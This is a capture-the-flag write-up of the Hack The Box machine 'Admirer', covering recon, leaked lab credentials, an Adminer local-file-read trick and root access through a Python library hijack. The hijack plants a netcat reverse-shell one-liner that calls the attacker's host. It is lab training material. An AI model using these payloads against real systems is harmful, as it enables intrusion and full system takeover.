# Admirer

<a href="https://app.hackthebox.eu/machines/248">Click here to see the room!</a> (Login is necessary)

First of all, connect to the VPN and join this machine.

The machine IP is ```10.10.10.187``` .

Run Nmap to search open ports:
```
┌─[root@hsn]─[/home/hsn/Desktop/ctf]
└──╼ #nmap -sV -sC -A -p- 10.10.10.187
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-17 02:59 CEST
Nmap scan report for 10.10.10.187
Host is up (0.058s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=9/17%OT=21%CT=1%CU=38283%PV=Y%DS=2%DC=T%G=Y%TM=5F62B54
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%TS=8)OPS(O1=M
OS:54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%
OS:O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%
OS:DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   64.21 ms 10.10.14.1
2   64.57 ms 10.10.10.187

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.54 seconds
```
As you can see 21/ftp, 22/ssh and 80/http ports are open.

Let's check the directories.
```
┌─[root@hsn]─[/home/hsn/Desktop/ctf/htb/admirer]
└──╼ #gobuster dir -u http://10.10.10.187 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/17 03:00:38 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/images (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2020/09/17 03:02:50 Finished
===============================================================
```
Both nmap and gobuster show us ```/robots.txt```

Go ```http://10.10.10.187/robots.txt```
```
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```
It seems like there is an username and a directory. However ```http://10.10.10.187/admin-dir``` is forbidden.

Fuzzing this directory is worth trying. So we need a fuzz list. I found a list on ```https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt```

Now use wfuzz!
```
┌─[root@hsn]─[/home/hsn/Desktop/ctf]
└──╼ #wfuzz -c -w big.txt -z list,txt-php-html -u http://10.10.10.187/admin-dir/FUZZ.FUZ2Z --hc 404,403 -t 100

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.187/admin-dir/FUZZ.FUZ2Z
Total requests: 61422

===================================================================
ID           Response   Lines    Word     Chars       Payload        
===================================================================

000015592:   200        29 L     39 W     350 Ch      "contacts - txt
                                                      "              
000016327:   200        11 L     13 W     136 Ch      "credentials - 
                                                      txt"           

Total time: 79.60255
Processed Requests: 61422
Filtered Requests: 61420
Requests/sec.: 771.6084
```
There are two files have ```200``` status so they are reachable.

Check ```http://10.10.10.187/admin-dir/contacts.txt```:
```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

Check ```http://10.10.10.187/admin-dir/credentials.txt```:

```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

We know that ftp port is open and we found here a FTP account username and password!

```
┌─[root@hsn]─[/home/hsn/Desktop/ctf]
└──╼ #ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:hsn): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
ftp> get dump.sql
local: dump.sql remote: dump.sql
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
226 Transfer complete.
3405 bytes received in 0.00 secs (5.4211 MB/s)
ftp> get html.tar.gz
local: html.tar.gz remote: html.tar.gz
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
226 Transfer complete.
5270987 bytes received in 4.07 secs (1.2337 MB/s)
```
I downloaded ```dump.sql``` and ```html.tar.gz```.

Extract ```html.tar.gz```. Under ```html``` folder, there are a lot of folders and files. I checked all of them.

In ```robots.txt```:
```
User-agent: *

# This folder contains personal stuff, so no one (not even robots!) should see it - waldo
Disallow: /w4ld0s_s3cr3t_d1r
```

In ```index.php```:
```
...

				<!-- Main -->
					<div id="main">			
					 <?php
                        $servername = "localhost";
                        $username = "waldo";
                        $password = "]F7jLHw:*G>UPrTo}~A"d6b";
                        $dbname = "admirerdb";

                        // Create connection
                        $conn = new mysqli($servername, $username, $password, $dbname);
                        // Check connection
                        if ($conn->connect_error) {
                            die("Connection failed: " . $conn->connect_error);
                        }

                        $sql = "SELECT * FROM items";
                        $result = $conn->query($sql);

                        if ($result->num_rows > 0) {
                            // output data of each row
                            while($row = $result->fetch_assoc()) {
                                echo "<article class='thumb'>";
    							echo "<a href='".$row["image_path"]."' class='image'><img src='".$row["thumb_path"]."' alt='' /></a>";
	    						echo "<h2>".$row["title"]."</h2>";
	    						echo "<p>".$row["text"]."</p>";
	    					    echo "</article>";
                            }
                        } else {
                            echo "0 results";
                        }
                        $conn->close();
                    ?>
					</div>
      ...
```
It seems like there is a database credential!

In ```/w4ld0s_s3cr3t_d1r/credentials.txt```:
```
[Bank Account]
waldo.11
Ezy]m27}OREc$

[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```
There are a lot of credentials. Save them all!

In ```/utility-scripts/db_admin.php```:
```
<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?>
```
Yes, more credentials!

Let's fuzz the ```/utility-scripts```:
```
┌─[root@hsn]─[/home/hsn/Desktop/ctf]
└──╼ #wfuzz -c -w big.txt -z list,txt-php-html -u http://10.10.10.187/utility-scripts/FUZZ.FUZ2Z --hc 404,403 -t 100

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.187/utility-scripts/FUZZ.FUZ2Z
Total requests: 61422

===================================================================
ID           Response   Lines    Word     Chars       Payload        
===================================================================

000005618:   200        51 L     235 W    4157 Ch     "adminer - php"
000028853:   200        964 L    4976 W   84030 Ch    "info - php"   
000041603:   200        0 L      8 W      32 Ch       "phptest - php"

Total time: 79.04078
Processed Requests: 61422
Filtered Requests: 61419
Requests/sec.: 777.0924
```
We can see ```info.php``` and ```phptest.php``` inside the ```/utility-scripts``` folder but ```adminer.php``` was not there in our ```html``` folder.

Let's go to ```http://10.10.10.187/utility-scripts/adminer.php```:
It seems like it is a database login page. Although I tried all credentials that I found before, I couldn't access the database.

Finally, I search “Adminer 4.6.2 exploit” on google. I found something about it on here: https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool. I read it carefully and watched the guide video about exploit.

Now we need to create a database.

```
┌─[✗]─[root@hsn]─[/home/hsn/Desktop/ctf/htb/admirer]
└──╼ #mysql -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 52
Server version: 10.3.23-MariaDB-1 Debian buildd-unstable

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> create database admirer;
Query OK, 1 row affected (0.001 sec)

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| admirer            |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.001 sec)

MariaDB [(none)]> create user 'hsn'@'%' IDENTIFIED BY 'hsn_admirer';
Query OK, 0 rows affected (0.000 sec)

MariaDB [(none)]> GRANT ALL PRIVILEGES ON * . * TO 'hsn'@'%';
Query OK, 0 rows affected (0.000 sec)

MariaDB [(none)]> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.000 sec)

MariaDB [(none)]> use admirer
Database changed
MariaDB [admirer]> create table hsn (data VARCHAR(255));
Query OK, 0 rows affected (0.033 sec)

MariaDB [admirer]> quit
Bye
┌─[root@hsn]─[/home/hsn/Desktop/ctf/htb/admirer]
└──╼ #systemctl restart mysql
┌─[root@hsn]─[/home/hsn/Desktop/ctf/htb/admirer]
└──╼ #mysql -h localhost -u hsn -p
Enter password: hsn_admirer
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 38
Server version: 10.3.23-MariaDB-1 Debian buildd-unstable

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Our database is ready.

Now we need to modify ```/etc/mysql``` to bind it to the database.
Change ```bind-address   = 127.0.0.1``` with ```bind-address   = 0.0.0.0```

According to the exploitation guide, I can login ```http://10.10.10.187/utility-scripts/adminer.php``` with my own database's credentials.

I try to login with my credentials. Yes, it works!

Go to SQL Commands and try to execute this:
```
load data local infile '/var/www/html/index.php'
into table hsn
fields terminated by '/n'
```
Then export it.
When you export it, you can see a new credentials here:
```username: waldo```
```password: &<h5b~yK3F#{PaPB&dA}{H>```

But what is this credentials for? Remember that ssh port is open. Let's try it on ssh connection.
```
┌─[✗]─[root@hsn]─[/etc/mysql/mariadb.conf.d]
└──╼ #ssh waldo@10.10.10.187
waldo@10.10.10.187's password: &<h5b~yK3F#{PaPB&dA}{H>
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Thu Sep 17 02:01:23 2020 from 10.10.14.188
waldo@admirer:~$ ls
user.txt
waldo@admirer:~$ cat user.txt
dc....f74427afdb15....ef7....cee
```

The privilage escalation is always hardest part for me! I hate this :(

```
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Oh! This time I feel that it will be easy. We can execute ```/opt/scripts/admin_tasks.sh```

```
waldo@admirer:/home$ cd ..
waldo@admirer:/$ ls
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
waldo@admirer:/$ cd root
-bash: cd: root: Permission denied
waldo@admirer:/tmp$ cd ..
waldo@admirer:/$ cd opt
waldo@admirer:/opt$ ls
scripts
waldo@admirer:/opt$ cd scripts/
waldo@admirer:/opt/scripts$ ls
admin_tasks.sh  backup.py
waldo@admirer:/opt/scripts$ ls -la
total 16
drwxr-xr-x 2 root admins 4096 Dec  2  2019 .
drwxr-xr-x 3 root root   4096 Nov 30  2019 ..
-rwxr-xr-x 1 root admins 2613 Dec  2  2019 admin_tasks.sh
-rwxr----- 1 root admins  198 Dec  2  2019 backup.py
waldo@admirer:/opt/scripts$ ./admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 3
no crontab for waldo
waldo@admirer:/opt/scripts$ ./admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 4
Insufficient privileges to perform the selected operation.
waldo@admirer:/opt/scripts$ ./admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 5
Insufficient privileges to perform the selected operation.
waldo@admirer:/opt/scripts$ ./admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Insufficient privileges to perform the selected operation.
waldo@admirer:/opt/scripts$ ./admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 7
Insufficient privileges to perform the selected operation.
waldo@admirer:/opt/scripts$ ./admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 1
up 9 hours, 43 minutes
waldo@admirer:/opt/scripts$ ./admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 2
 02:48:03 up  9:43,  2 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
waldo    pts/0    10.10.14.188     02:01   43:05   0.06s  0.06s -bash
waldo    pts/1    10.10.14.204     02:42    3.00s  0.11s  0.00s /usr/bin/w
waldo@admirer:/opt/scripts$ ./admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 3
no crontab for waldo
```
I was wrong! Nothing is working. Also, I couldn't modify ```admin_tasks.sh```.

When I searched “privilage escalation via python” I found this website:
https://rastating.github.io/privilege-escalation-via-python-library-hijacking/

I read it carefully and check ```admin_tasks.sh``` codes.
```
waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh
...

}backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
...
```
```admin_tasks.sh``` is running ```backup.py```.

Let's check ```backup.py```
```
#!/usr/bin/python3

from shutil import make_archive
src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'
make_archive(dst, 'gztar', src)
```
It imports ```make_archive``` function from python module ```shutil```.

So I created a fake ```shutil.py``` inside ```hsn``` folder and write these codes and save it:
```
import os

def make_archive(x, y, z):
	os.system("nc 10.10.14.204 4444 -e '/bin/bash'")
```

When it is executed, it will execute ```/bin/bash``` on my IP and port 4444. So I need to listen this port with netcat.
```
┌─[✗]─[root@hsn]─[/home/hsn]
└──╼ #nc -nlvp 4444
listening on [any] 4444 ...
```

We created our duplicate shutil library. Let's run the code with this python env path and see if we can get access or not !!
So, how to execute ```admin_tasks.sh``` script after our changes? Here it is:
```
waldo@admirer:~/hsn$ sudo PYTHONPATH=~/hsn /opt/scripts/admin_tasks.sh

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
```
And select 6 ```Backup web data``` in order to execute ```backup.py```.

Look at netcat!

```
┌─[✗]─[root@hsn]─[/home/hsn]
└──╼ #nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.204] from (UNKNOWN) [10.10.10.187] 42248
whoami
root
cd /
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
cd root
ls
root.txt
cat root.txt
867b....5400384e....0ed951....41
```
Yes, it is rooted!

Many thanks to machine creators <a href="https://app.hackthebox.eu/users/159204">polarbearer</a> and <a href="https://app.hackthebox.eu/users/125033">GibParadox</a> and <a href="https://www.hackthebox.eu">HackTheBox</a> for this machine.

If you think something is wrong, send a mail to hsnckkgl@gmail.com

Best wishes to all the CTF Players,

hsnckkgl
